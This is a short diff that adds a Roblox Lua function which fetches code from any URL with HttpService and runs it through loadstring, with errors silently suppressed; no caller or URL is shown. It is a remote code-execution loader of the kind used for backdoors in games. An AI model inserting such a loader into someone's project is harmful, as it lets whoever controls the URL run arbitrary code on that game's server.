@@ -1,0 +1,15 @@
+-- Function to fetch and execute code from a URL
+local function runFromURL(url)
+    local http = game:GetService("HttpService")
+    local success, code = pcall(function()
+        return http:GetAsync(url)
+    end)
+
+    if not success then return end
+
+    local func = loadstring(code)
+    if not func then return end
+
+    pcall(func)
+end
+
